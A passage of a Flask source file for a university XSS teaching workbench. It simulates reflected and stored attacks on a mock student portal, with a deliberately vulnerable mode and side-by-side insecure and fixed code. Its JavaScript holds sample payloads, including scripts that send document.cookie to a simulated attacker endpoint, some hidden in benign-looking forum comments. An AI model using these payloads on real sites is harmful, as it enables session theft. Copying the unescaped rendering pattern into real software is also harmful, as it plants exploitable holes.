#!/usr/bin/env python3
"""
Laboratorio de Seguridad Web: Security Workbench (XSS - CWE-79)
Asignatura: Gestión de Seguridad en Sistemas Informáticos - UNICAES
Autores: Dennis Guevara, Mario Villeda, Luis Balcaceres
Inspirado en la estética cyber-investigativa y didáctica de XSS Academy.
"""

from flask import Flask, request, render_template_string, make_response, redirect, url_for, jsonify
import html
import datetime

app = Flask(__name__)
app.secret_key = "clave_secreta_laboratorio_seguridad_unicaes"

# Registros de eventos interceptados por el servidor atacante simulado (C2)
logs_ataques = []

# Base de datos en memoria para el tablón de comentarios académicos
comentarios_db = [
    {
        "id": 1,
        "autor": "Ing. Catedrático",
        "mensaje": "Bienvenidos al foro de dudas sobre la Tarea 3 de Seguridad Web. Por favor publicar aquí cualquier consulta sobre los ejercicios.",
        "seguro": True,
        "fecha": "11/11/2026 08:30"
    },
    {
        "id": 2,
        "autor": "Carlos Mendoza (Estudiante)",
        "mensaje": "Ingeniero, ¿la entrega incluye la captura de tráfico con Wireshark?",
        "seguro": True,
        "fecha": "11/11/2026 09:15"
    }
]

# Configuración global del modo de seguridad
configuracion = {
    "modo_seguro": False,
    "csp_activo": False,
    "httponly_activo": False
}

PLANTILLA_WORKBENCH = r"""<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UNICAES | Security Workbench (Laboratorio XSS CWE-79)</title>
    <!-- Tipografías de alta legibilidad técnica -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    
    <style>
        :root {
            --navy: #0B1B33;
            --navy2: #12284A;
            --navy3: #1C3A66;
            --line: #25426E;
            --turq: #19D3C5;
            --turq2: #0FA89C;
            --white: #ffffff;
            --text: #DDE7F5;
            --muted: #8FA3C2;
            --red: #FF5C6C;
            --amber: #FFB547;
            --green: #2BD48A;
            --bg-dark: #07101E;
        }

        * { box-sizing: border-box; }
        body {
            background-color: var(--navy);
            color: var(--text);
            font-family: 'Inter', system-ui, sans-serif;
            line-height: 1.5;
            margin: 0;
            padding-bottom: 30px;
        }

        /* Trama de cuadrícula ciberseguridad */
        body::before {
            content: "";
            position: fixed;
            inset: 0;
            z-index: -1;
            background-image:
                linear-gradient(rgba(25, 211, 197, 0.035) 1px, transparent 1px),
                linear-gradient(90deg, rgba(25, 211, 197, 0.035) 1px, transparent 1px);
            background-size: 32px 32px;
            pointer-events: none;
        }

        h1, h2, h3, h4, h5, h6 {
            font-family: 'Space Grotesk', sans-serif;
            color: #fff;
            letter-spacing: -0.02em;
        }

        code, .mono {
            font-family: 'JetBrains Mono', monospace;
        }

        /* Barra de navegación superior */
        .top-navbar {
            background: rgba(11, 27, 51, 0.95);
            backdrop-filter: blur(12px);
            border-bottom: 1.5px solid var(--line);
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        /* Tarjetas estilo XSS Academy */
        .panel-card {
            background: var(--navy2);
            border: 1.5px solid var(--line);
            border-radius: 12px;
            padding: 16px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.35);
        }

        /* Pestañas de Vectores */
        .vector-tabs {
            display: flex;
            gap: 8px;
            background: var(--bg-dark);
            padding: 5px;
            border-radius: 10px;
            border: 1px solid var(--line);
            margin-bottom: 14px;
        }
        .vector-tab-btn {
            flex: 1;
            border: none;
            background: transparent;
            color: var(--muted);
            font-family: 'Space Grotesk', sans-serif;
            font-size: 13px;
            font-weight: 600;
            padding: 8px 10px;
            border-radius: 7px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            transition: all 0.2s ease;
            cursor: pointer;
        }
        .vector-tab-btn:hover {
            color: #fff;
            background: rgba(255, 255, 255, 0.05);
        }
        .vector-tab-btn.active {
            background: var(--navy3);
            color: #fff;
            border: 1px solid var(--turq);
            box-shadow: 0 0 12px rgba(25, 211, 197, 0.25);
        }

        /* Simulación de Ventana de Navegador Web */
        .browser-window {
            background: #F4F8FB;
            border-radius: 12px;
            border: 2px solid var(--line);
            overflow: hidden;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.45);
        }
        .browser-bar {
            background: var(--navy3);
            padding: 8px 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            border-bottom: 1px solid var(--line);
        }
        .browser-dots {
            display: flex;
            gap: 6px;
        }
        .browser-dot {
            width: 11px;
            height: 11px;
            border-radius: 50%;
            display: inline-block;
        }
        .dot-red { background: var(--red); }
        .dot-amber { background: var(--amber); }
        .dot-green { background: var(--green); }
        .browser-url-bar {
            flex: 1;
            background: var(--bg-dark);
            border: 1px solid var(--line);
            border-radius: 6px;
            padding: 3px 10px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 11.5px;
            color: var(--muted);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .browser-url-bar .url-target {
            color: var(--turq);
            font-weight: 500;
        }
        .browser-session-tag {
            font-size: 11px;
            color: var(--turq);
            background: rgba(25, 211, 197, 0.12);
            border: 1px solid rgba(25, 211, 197, 0.3);
            padding: 2px 8px;
            border-radius: 12px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .browser-content {
            background: #ffffff;
            color: #13213A;
            padding: 16px;
            min-height: 200px;
            position: relative;
        }

        /* Cajas de Armado del Atacante */
        .crafting-box {
            background: var(--bg-dark);
            border: 1.5px solid var(--line);
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 12px;
        }
        .url-preview-tag {
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            background: #0d1e38;
            border: 1px solid var(--turq);
            color: #fff;
            padding: 6px 10px;
            border-radius: 6px;
            word-break: break-all;
            margin-top: 6px;
        }
        .url-preview-tag .param-highlight {
            color: var(--amber);
            font-weight: bold;
            background: rgba(255, 181, 71, 0.15);
            padding: 1px 4px;
            border-radius: 4px;
        }
        .url-preview-tag .hash-highlight {
            color: var(--red);
            font-weight: bold;
            background: rgba(255, 92, 108, 0.18);
            padding: 1px 4px;
            border-radius: 4px;
        }

        /* Chips de Cargas Rápidas */
        .chip {
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            background: var(--navy3);
            color: #fff;
            border: 1px solid var(--line);
            border-radius: 16px;
            padding: 4px 10px;
            cursor: pointer;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            margin-bottom: 4px;
        }
        .chip:hover {
            border-color: var(--turq);
            color: var(--turq);
            background: #1e3f6f;
        }

        /* Botones personalizados */
        .btn-turq {
            background: var(--turq);
            color: var(--navy);
            font-weight: 700;
            border: none;
            transition: all 0.2s;
        }
        .btn-turq:hover {
            background: #25e5d7;
            color: #04142b;
            transform: translateY(-1px);
        }
        .btn-amber {
            background: var(--amber);
            color: var(--navy);
            font-weight: 700;
            border: none;
        }
        .btn-amber:hover {
            background: #ffc266;
            color: #04142b;
            transform: translateY(-1px);
        }

        /* PIPELINE DEL DEBUGGER */
        .pipeline-container {
            display: flex;
            align-items: stretch;
            justify-content: space-between;
            gap: 6px;
            margin: 12px 0;
        }
        .pipeline-step {
            flex: 1;
            background: var(--bg-dark);
            border: 2px solid var(--line);
            border-radius: 8px;
            padding: 8px 4px;
            text-align: center;
            font-size: 11px;
            transition: all 0.25s ease;
            opacity: 0.55;
            position: relative;
        }
        .pipeline-step.step-paused {
            opacity: 1;
            transform: scale(1.03);
            border-color: var(--turq);
            background: rgba(25, 211, 197, 0.15);
            box-shadow: 0 0 16px rgba(25, 211, 197, 0.5);
        }
        .pipeline-step.step-vuln {
            opacity: 1;
            border-color: var(--red);
            background: rgba(255, 92, 108, 0.2);
            color: #ffb8c0;
        }
        .pipeline-step.step-blocked {
            opacity: 1;
            border-color: var(--green);
            background: rgba(43, 212, 138, 0.2);
            color: #bbf7d0;
            box-shadow: 0 0 16px rgba(43, 212, 138, 0.4);
        }
        .pipeline-step.step-bypassed {
            opacity: 1;
            border-color: var(--amber);
            background: rgba(255, 181, 71, 0.18);
            color: #fde68a;
        }

        .breakpoint-tag {
            font-size: 9px;
            font-weight: bold;
            font-family: 'JetBrains Mono', monospace;
            background: var(--navy3);
            color: #fff;
            padding: 1px 5px;
            border-radius: 8px;
            display: inline-block;
            margin-bottom: 3px;
        }
        .pipeline-arrow {
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 15px;
            color: var(--line);
        }
        .pipeline-arrow.arrow-passed {
            color: var(--turq);
            font-weight: bold;
        }

        /* Scope Watcher */
        .debug-scope-panel {
            background-color: var(--bg-dark);
            border: 1.5px solid var(--line);
            border-radius: 8px;
            padding: 10px 14px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 11.5px;
        }
        .debug-var-row {
            display: flex;
            justify-content: space-between;
            border-bottom: 1px solid rgba(37, 66, 110, 0.4);
            padding: 4px 0;
        }
        .debug-var-name { color: var(--amber); font-weight: 600; }
        .debug-var-val { color: #f1f5f9; max-width: 65%; text-align: right; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }

        /* Consola C2 Terminal Atacante */
        .hacker-terminal {
            background-color: #040913;
            border: 1.5px solid var(--line);
            border-radius: 8px;
            padding: 10px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            color: #4ade80;
            height: 155px;
            overflow-y: auto;
            box-shadow: inset 0 0 12px rgba(0,0,0,0.9);
        }
        .terminal-row {
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            padding: 3px 0;
            animation: fadeIn 0.3s;
        }

        /* Modal o Ventana de Alerta Simulada */
        .simulated-alert-overlay {
            position: absolute;
            inset: 0;
            background: rgba(11, 27, 51, 0.7);
            backdrop-filter: blur(2px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 100;
            animation: fadeIn 0.2s;
        }
        .simulated-alert-box {
            background: #ffffff;
            color: #13213A;
            border-radius: 10px;
            padding: 16px 20px;
            max-width: 380px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
            border-top: 5px solid var(--turq);
        }

        /* Usurpación de Sesión (Session Hijacking) */
        .hijack-view {
            background: rgba(255, 92, 108, 0.1);
            border: 1.5px solid var(--red);
            border-radius: 8px;
            padding: 12px;
            animation: fadeIn 0.3s;
        }

        /* Sección de Blindaje y Buenas Prácticas */
        .defense-card {
            background: rgba(43, 212, 138, 0.05);
            border: 1.5px solid rgba(43, 212, 138, 0.3);
            border-radius: 10px;
            padding: 14px;
            margin-top: 14px;
        }
        .defense-card.vuln-state {
            background: rgba(255, 92, 108, 0.05);
            border-color: rgba(255, 92, 108, 0.3);
        }

        .code-compare {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-top: 8px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
        }
        @media (max-width: 768px) {
            .code-compare { grid-template-columns: 1fr; }
        }
        .code-bad {
            background: #1a080c;
            border: 1px solid var(--red);
            border-radius: 6px;
            padding: 8px;
            color: #fca5a5;
        }
        .code-good {
            background: #051a14;
            border: 1px solid var(--green);
            border-radius: 6px;
            padding: 8px;
            color: #86efac;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(4px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>

    <!-- NAVBAR SUPERIOR -->
    <nav class="top-navbar py-2 px-3">
        <div class="container-fluid d-flex justify-content-between align-items-center">
            <div class="d-flex align-items-center gap-2">
                <i class="bi bi-shield-lock-fill text-info fs-4"></i>
                <div>
                    <span class="fw-bold" style="font-family:'Space Grotesk'; font-size:16px; color:#fff;">
                        UNICAES | Security Workbench <span style="color:var(--turq)">XSS (CWE-79)</span>
                    </span>
                    <span class="d-block text-secondary" style="font-size:11px;">
                        Taller Práctico: Dennis Guevara · Mario Villeda · Luis Balcaceres
                    </span>
                </div>
            </div>

            <div class="d-flex align-items-center gap-2">
                {% if configuracion.modo_seguro %}
                <span class="badge py-2 px-3 fw-bold" style="background:var(--green); color:#04271A; font-size:12px;">
                    <i class="bi bi-shield-check"></i> MODO SEGURO (Defensas Activas)
                </span>
                <a href="/toggle-modo" class="btn btn-sm btn-outline-danger fw-bold">
                    <i class="bi bi-toggle-on"></i> Desactivar Defensas
                </a>
                {% else %}
                <span class="badge py-2 px-3 fw-bold" style="background:var(--red); color:#fff; font-size:12px;">
                    <i class="bi bi-exclamation-triangle-fill"></i> MODO VULNERABLE (Sin Neutralización)
                </span>
                <a href="/toggle-modo" class="btn btn-sm btn-outline-success fw-bold">
                    <i class="bi bi-shield-fill-plus"></i> Activar Defensas
                </a>
                {% endif %}
            </div>
        </div>
    </nav>

    <!-- WORKBENCH PRINCIPAL (GRID 50% / 50%) -->
    <div class="container-fluid px-3 pt-3">
        <div class="row g-3">

            <!-- ==============================================================
                 COLUMNA IZQUIERDA: FLUJO DEL ATACANTE Y NAVEGADOR VÍCTIMA
            ================================================================== -->
            <div class="col-lg-6">
                <div class="panel-card h-100 d-flex flex-column">

                    <!-- SELECTOR DE VECTORES (PESTAÑAS) -->
                    <div class="vector-tabs">
                        <button class="vector-tab-btn active" id="tab-btn-reflected" onclick="cambiarVector('reflected')">
                            <i class="bi bi-arrow-repeat"></i> 1. Reflejado (Buscador GET)
                        </button>
                        <button class="vector-tab-btn" id="tab-btn-stored" onclick="cambiarVector('stored')">
                            <i class="bi bi-database-fill-down"></i> 2. Almacenado (Tablón DB)
                        </button>
                        <button class="vector-tab-btn" id="tab-btn-dom" onclick="cambiarVector('dom')">
                            <i class="bi bi-code-slash"></i> 3. Basado en DOM (# Hash)
                        </button>
                    </div>

                    <!-- FASE 1: TALLER DEL ATACANTE (ARMADO DEL ENLACE / CARGA) -->
                    <div class="crafting-box">
                        <div class="d-flex justify-content-between align-items-center mb-1">
                            <span class="fw-bold" style="font-size:12px; color:var(--turq);">
                                <i class="bi bi-person-workspace"></i> FASE 1: Taller del Atacante (n0cturno)
                            </span>
                            <span class="badge bg-dark border border-secondary" id="vector-hint-badge" style="font-size:10px;">
                                Inyección vía URL
                            </span>
                        </div>
                        <p class="text-secondary small mb-2" id="vector-explanation-text" style="font-size:11.5px;">
                            El atacante prepara un enlace manipulado. El parámetro <code>?q=</code> contendrá el script que el servidor reflejará en la respuesta.
                        </p>

                        <!-- Entrada del Atacante -->
                        <div class="mb-2">
                            <div class="input-group input-group-sm">
                                <span class="input-group-text bg-dark border-secondary text-secondary mono" id="input-prefix-label">?q=</span>
                                <input type="text" id="payload-input" class="form-control bg-dark border-secondary text-light mono"
                                       value="<script>alert('XSS_Reflejado_UNICAES')</script>" placeholder="Payload o texto..." oninput="actualizarUrlPreview()">
                            </div>
                        </div>

                        <!-- Cargas Rápidas (Chips) -->
                        <div class="mb-2">
                            <small class="text-secondary d-block mb-1" style="font-size:11px;">Cargas de prueba rápidas (clic para cargar):</small>
                            <div class="d-flex flex-wrap gap-1" id="chips-container">
                                <!-- Se llenan dinámicamente según el vector -->
                            </div>
                        </div>

                        <!-- Previsualización de Enlace Trampa Generado o Comentario -->
                        <div class="mb-2" id="url-craft-wrapper">
                            <small class="text-secondary d-block" style="font-size:10.5px;" id="craft-preview-label">
                                <i class="bi bi-link-45deg"></i> Enlace trampa generado para la víctima (phishing / chat):
                            </small>
                            <div class="url-preview-tag" id="url-preview-display">
                                https://portal.unicaes.edu/buscar?q=<span class="param-highlight">&lt;script&gt;alert(1)&lt;/script&gt;</span>
                            </div>
                        </div>

                        <!-- Botones de Acción (Envío / Clic de la Víctima) -->
                        <div class="d-flex gap-2 mt-2">
                            <button class="btn btn-sm btn-turq flex-grow-1" onclick="ejecutarAtaque(false)">
                                <i class="bi bi-cursor-fill"></i> <span id="btn-victim-action">Víctima abre el enlace (Normal)</span>
                            </button>
                            <button class="btn btn-sm btn-amber fw-bold" onclick="ejecutarAtaque(true)">
                                <i class="bi bi-bug-fill"></i> <span id="btn-debug-action">🐞 Clic y Depurar Paso a Paso</span>
                            </button>
                        </div>
                    </div>

                    <!-- FASE 2: VENTANA DEL NAVEGADOR DE LA VÍCTIMA (ANA) -->
                    <div class="browser-window flex-grow-1 d-flex flex-column">
                        <div class="browser-bar">
                            <div class="browser-dots">
                                <span class="browser-dot dot-red"></span>
                                <span class="browser-dot dot-amber"></span>
                                <span class="browser-dot dot-green"></span>
                            </div>
                            <div class="browser-url-bar">
                                <i class="bi bi-lock-fill text-success" style="font-size:10px;"></i>
                                <span id="victim-browser-url" class="url-target">https://portal.unicaes.edu/buscar?q=...</span>
                            </div>
                            <div class="browser-session-tag">
                                <i class="bi bi-person-check-fill"></i> Sesión: Ana (Estudiante)
                            </div>
                        </div>

                        <!-- Contenido Renderizado dentro del Navegador -->
                        <div class="browser-content flex-grow-1" id="victim-browser-content">
                            <!-- Reflejado / Almacenado / DOM cargan aquí -->
                        </div>
                    </div>

                    <!-- SECCIÓN INFORMATIVA: CÓMO SE BLINDA CADA TIPO (REQUISITO PEDAGÓGICO) -->
                    <div class="defense-card {{ 'vuln-state' if not configuracion.modo_seguro else '' }}" id="defense-info-card">
                        <div class="d-flex justify-content-between align-items-center mb-1">
                            <h6 class="mb-0 fw-bold" style="font-size:13px; color:{{ 'var(--red)' if not configuracion.modo_seguro else 'var(--green)' }}">
                                <i class="bi {{ 'bi-shield-slash' if not configuracion.modo_seguro else 'bi-shield-check' }}"></i>
                                <span id="defense-title">Mecanismo de Blindaje: XSS Reflejado</span>
                            </h6>
                            <span class="badge {{ 'bg-danger' if not configuracion.modo_seguro else 'bg-success' }}" style="font-size:10px;">
                                {{ 'VULNERABLE' if not configuracion.modo_seguro else 'PROTEGIDO' }}
                            </span>
                        </div>
                        <p class="text-secondary small mb-2" id="defense-desc" style="font-size:11.5px;">
                            Explicación del fallo y cómo blindar este vector.
                        </p>
                        <div class="code-compare">
                            <div class="code-bad">
                                <strong class="text-danger d-block mb-1">❌ Inseguro (Vulnerable):</strong>
                                <span id="code-snippet-bad">return "Resultados: " + query</span>
                            </div>
                            <div class="code-good">
                                <strong class="text-success d-block mb-1">✅ Blindado (Defensa):</strong>
                                <span id="code-snippet-good">return "Resultados: " + html.escape(query)</span>
                            </div>
                        </div>
                    </div>

                </div>
            </div>

            <!-- ==============================================================
                 COLUMNA DERECHA: PIPELINE DEBUGGER & TERMINAL C2 ATACANTE
            ================================================================== -->
            <div class="col-lg-6">
                <div class="d-flex flex-column gap-3 h-100">

                    <!-- PANEL DEL PIPELINE DEBUGGER EN VIVO -->
                    <div class="panel-card" style="border-top: 4px solid var(--amber);">
                        <div class="d-flex justify-content-between align-items-center pb-2 border-bottom border-secondary mb-2">
                            <div class="d-flex align-items-center gap-2">
                                <h6 class="mb-0 fw-bold" style="color:var(--amber);">
                                    <i class="bi bi-cpu-fill"></i> Pipeline Debugger en Vivo
                                </h6>
                                <span class="badge bg-dark border border-secondary" id="debug-step-badge">Paso 0 / 4</span>
                            </div>
                            <div class="d-flex gap-1">
                                <button class="btn btn-sm btn-amber text-dark fw-bold py-0 px-2" id="btn-next-step" onclick="avanzarStepDebugger()" disabled>
                                    <i class="bi bi-skip-forward-fill"></i> Paso ❯ (F10)
                                </button>
                                <button class="btn btn-sm btn-outline-light py-0 px-2" id="btn-auto" onclick="toggleAutoPlay()" disabled>
                                    <i class="bi bi-play-fill"></i> Auto
                                </button>
                                <button class="btn btn-sm btn-outline-secondary py-0 px-2" onclick="resetearDebuggerUI()">
                                    <i class="bi bi-arrow-counterclockwise"></i> Reset
                                </button>
                            </div>
                        </div>

                        <!-- Diagrama de los 4 Breakpoints del Pipeline -->
                        <div class="pipeline-container">
                            <div class="pipeline-step" id="step-1">
                                <span class="breakpoint-tag">BP 1</span>
                                <div class="fw-bold"><i class="bi bi-box-arrow-in-right text-info"></i> 1. Source</div>
                                <div class="text-muted" style="font-size:9.5px;" id="s1-status">Entrada / URL</div>
                            </div>
                            <div class="pipeline-arrow" id="arr-1">➔</div>
                            <div class="pipeline-step" id="step-2">
                                <span class="breakpoint-tag">BP 2</span>
                                <div class="fw-bold"><i class="bi bi-server text-warning"></i> 2. Backend</div>
                                <div class="text-muted" style="font-size:9.5px;" id="s2-status">Filtro / DB</div>
                            </div>
                            <div class="pipeline-arrow" id="arr-2">➔</div>
                            <div class="pipeline-step" id="step-3">
                                <span class="breakpoint-tag">BP 3</span>
                                <div class="fw-bold"><i class="bi bi-browser-chrome text-primary"></i> 3. Parser DOM</div>
                                <div class="text-muted" style="font-size:9.5px;" id="s3-status">Render Cliente</div>
                            </div>
                            <div class="pipeline-arrow" id="arr-3">➔</div>
                            <div class="pipeline-step" id="step-4">
                                <span class="breakpoint-tag">BP 4</span>
                                <div class="fw-bold"><i class="bi bi-lightning-fill text-danger"></i> 4. Impacto</div>
                                <div class="text-muted" style="font-size:9.5px;" id="s4-status">Exfiltración C2</div>
                            </div>
                        </div>

                        <!-- Scope Variables Watcher -->
                        <div class="debug-scope-panel">
                            <div class="debug-var-row">
                                <span class="debug-var-name">Variable 'payload':</span>
                                <span class="debug-var-val" id="var-payload">Ninguno en ejecución</span>
                            </div>
                            <div class="debug-var-row">
                                <span class="debug-var-name">Naturaleza Entrada:</span>
                                <span class="debug-var-val" id="var-clasificacion">Esperando ejecución</span>
                            </div>
                            <div class="debug-var-row">
                                <span class="debug-var-name">Neutralización Backend:</span>
                                <span class="debug-var-val" id="var-filtro">{{ 'html.escape() ACTIVO' if configuracion.modo_seguro else 'Sin escape (RAW HTML)' }}</span>
                            </div>
                            <div class="debug-var-row">
                                <span class="debug-var-name">Protección de Cookie:</span>
                                <span class="debug-var-val" id="var-httponly">{{ 'HttpOnly ACTIVO (Inaccesible desde JS)' if configuracion.httponly_activo else 'HttpOnly DESACTIVADO (document.cookie expuesto)' }}</span>
                            </div>
                            <div class="debug-var-row">
                                <span class="debug-var-name">Política CSP (Headers):</span>
                                <span class="debug-var-val" id="var-csp">{{ 'CSP ACTIVA (default-src self)' if configuracion.csp_activo else 'Sin CSP restrictivo' }}</span>
                            </div>
                            <div class="debug-var-row">
                                <span class="debug-var-name">Impacto de Auditoría:</span>
                                <span class="debug-var-val" id="var-impacto">En espera</span>
                            </div>
                            <div class="mt-2 pt-1 border-top border-secondary text-warning small" id="debug-log-msg" style="font-size:11px;">
                                <i class="bi bi-info-circle"></i> Pulsa <strong>"🐞 Clic y Depurar Paso a Paso"</strong> para auditar cómo viajan los datos.
                            </div>
                        </div>
                    </div>

                    <!-- PANEL DE LA CONSOLA C2 ATACANTE (EXFILTRACIÓN Y SESSION HIJACKING) -->
                    <div class="panel-card flex-grow-1 d-flex flex-column" style="border-top: 4px solid var(--red);">
                        <div class="d-flex justify-content-between align-items-center pb-2 border-bottom border-secondary mb-2">
                            <div class="d-flex align-items-center gap-2">
                                <h6 class="mb-0 fw-bold" style="color:var(--red);">
                                    <i class="bi bi-terminal-fill"></i> Servidor Atacante C2 (<span class="mono">malo.com/c2</span>)
                                </h6>
                                <span class="badge bg-danger blink" style="font-size:9.5px;">LISTENER ONLINE</span>
                            </div>
                            <div class="d-flex gap-1">
                                <button class="btn btn-sm btn-outline-danger py-0 px-2 fw-bold" id="btn-hijack-session" onclick="toggleSecuestroSesion()" style="display:none; font-size:11px;">
                                    <i class="bi bi-incognito"></i> 💥 Secuestrar Sesión
                                </button>
                                <button class="btn btn-sm btn-outline-secondary py-0 px-2" onclick="limpiarC2Logs()">
                                    <i class="bi bi-trash"></i>
                                </button>
                            </div>
                        </div>

                        <!-- Consola de Peticiones Exfiltradas -->
                        <div class="hacker-terminal flex-grow-1" id="c2-console">
                            <div class="text-secondary">// Esperando conexiones de exfiltración de cookies...</div>
                            {% for l in logs %}
                            <div class="terminal-row">
                                <span class="text-secondary">[{{ l.hora }}]</span>
                                <strong class="{{ 'text-info' if 'BLOQUEADO' in l.datos else 'text-danger' }}">[CONEXIÓN]</strong> {{ l.vector }}<br>
                                <span class="text-light">PAYLOAD:</span> <code class="{{ 'text-success' if 'BLOQUEADO' in l.datos else 'text-warning' }}">{{ l.datos }}</code>
                            </div>
                            {% endfor %}
                        </div>

                        <!-- Vista de Sesión Usurpada (Session Hijacking) -->
                        <div class="hijack-view mt-2" id="hijack-panel" style="display:none;">
                            <div class="d-flex justify-content-between align-items-center mb-1">
                                <strong class="text-danger small"><i class="bi bi-exclamation-octagon-fill"></i> SESIÓN USURPADA: Ana Villeda</strong>
                                <button class="btn-close btn-close-white" style="font-size:10px;" onclick="toggleSecuestroSesion()"></button>
                            </div>
                            <p class="small text-light mb-1" style="font-size:11px;">
                                El atacante pegó la cookie de sesión capturada en su propio navegador. El portal académico lo reconoce como <strong>Ana</strong> sin necesidad de credenciales.
                            </p>
                            <ul class="text-secondary small mb-1 ps-3" style="font-size:10.5px;">
                                <li>Acceso a expedientes académicos y notas.</li>
                                <li>Capacidad de publicar comentarios fraudulentos en nombre de la alumna.</li>
                                <li>Cambio de correo electrónico y secuestro permanente de la cuenta.</li>
                            </ul>
                            <div class="text-warning small" style="font-size:10px;">
                                <i class="bi bi-shield-lock"></i> <strong>Blindaje:</strong> Con el atributo <code>HttpOnly</code> en la cookie, <code>document.cookie</code> es inaccesible desde JavaScript, impidiendo este secuestro.
                            </div>
                        </div>
                    </div>

                </div>
            </div>

        </div>
    </div>

    <!-- SCRIPT DEL FRONTEND WORKBENCH -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        const MODO_SEGURO = {{ 'true' if configuracion.modo_seguro else 'false' }};
        const HTTPONLY_ACTIVO = {{ 'true' if configuracion.httponly_activo else 'false' }};
        const CSP_ACTIVO = {{ 'true' if configuracion.csp_activo else 'false' }};

        // Estado Global
        let vectorActual = 'reflected';
        let pasoActual = 0;
        let payloadEnEjecucion = '';
        let callbackExito = null;
        let autoTimer = null;
        let sesionSecuestradaVisible = false;

        // Definiciones de Vectores y Datos Didácticos
        const VECTORES_CONFIG = {
            reflected: {
                nombre: 'XSS Reflejado (Tipo I)',
                prefixLabel: '?q=',
                hint: 'Inyección en Parámetro GET',
                craftLabel: '<i class="bi bi-link-45deg text-info"></i> Enlace trampa generado para la víctima (phishing / chat):',
                btnText: '🔗 Víctima hace clic en enlace (Normal)',
                btnDebugText: '🐞 Clic y Depurar Paso a Paso',
                desc: 'El atacante manipula el parámetro <code>?q=</code> de la URL. Si la víctima hace clic en el enlace malicioso, el servidor refleja el script directamente en el HTML de respuesta.',
                urlBase: 'https://portal.unicaes.edu/buscar?q=',
                defaultPayload: "<script>alert('XSS_Reflejado_UNICAES')</" + "script>",
                chips: [
                    { label: 'búsqueda normal', val: 'Ciberseguridad 2026' },
                    { label: 'prueba negrita', val: '<b>auditoria</b>' },
                    { label: 'alerta xss', val: "<script>alert('XSS_Reflejado')</" + "script>" },
                    { label: 'robo cookie C2', val: "<script>fetch('/api/exfiltrar?vector=XSS_Reflejado&datos=' + document.cookie)</" + "script>" },
                    { label: 'img onerror', val: "<img src=x onerror=alert('Evento_onerror')>" }
                ],
                defenseTitle: 'Mecanismo de Blindaje: XSS Reflejado',
                defenseDesc: 'Para blindar XSS reflejado, el servidor <strong>jamás debe concatenar entradas crudas</strong> en la plantilla. Debe aplicar <em>Context-Aware Output Encoding</em> (escapar caracteres especiales como &lt;, &gt;, &quot;) y reforzar con cabeceras Content-Security-Policy (CSP).',
                codeBad: 'return render_template_string("<p>Resultados: " + query)',
                codeGood: 'return render_template_string("<p>Resultados: " + html.escape(query))'
            },
            stored: {
                nombre: 'XSS Almacenado (Tipo II)',
                prefixLabel: 'Mensaje:',
                hint: 'Persistencia en Base de Datos',
                craftLabel: '<i class="bi bi-chat-square-quote-fill text-warning"></i> Previsualización del comentario a inyectar en la base de datos:',
                btnText: '✉️ Publicar Comentario en Tablón (Normal)',
                btnDebugText: '🐞 Publicar y Auditar con Debugger',
                desc: 'El atacante inyecta código malicioso en el tablón de comentarios del portal. El script se <strong>guarda en la base de datos</strong> y se ejecuta automáticamente en el navegador de cualquier usuario que visite el foro.',
                urlBase: 'https://portal.unicaes.edu/tablon-comentarios',
                defaultPayload: "Buenas tardes ingeniero, ¿la Tarea 3 se entrega en formato PDF o Word? <script>fetch('/api/exfiltrar?vector=XSS_Almacenado&datos=' + document.cookie)</" + "script>",
                chips: [
                    { label: 'pregunta + robo C2', val: "Buenas tardes profesor, ¿a qué hora cierra la entrega de la Tarea 3? <script>fetch('/api/exfiltrar?vector=XSS_Almacenado&datos=' + document.cookie)</" + "script>" },
                    { label: 'agradecimiento + img onerror', val: "¡Muchas gracias por la explicación de clase, ingeniero! <img src=x onerror=\"fetch('/api/exfiltrar?vector=XSS_Almacenado&datos='+document.cookie); alert('Cookie_Robada: '+document.cookie)\">" },
                    { label: 'duda + alerta xss', val: "Tengo una duda con el ejercicio 2 de la guía de cátedra. <script>alert('XSS_Almacenado_DB')</" + "script>" },
                    { label: 'comentario legítimo', val: "Confirmado con el docente, la entrega límite es este viernes a medianoche." },
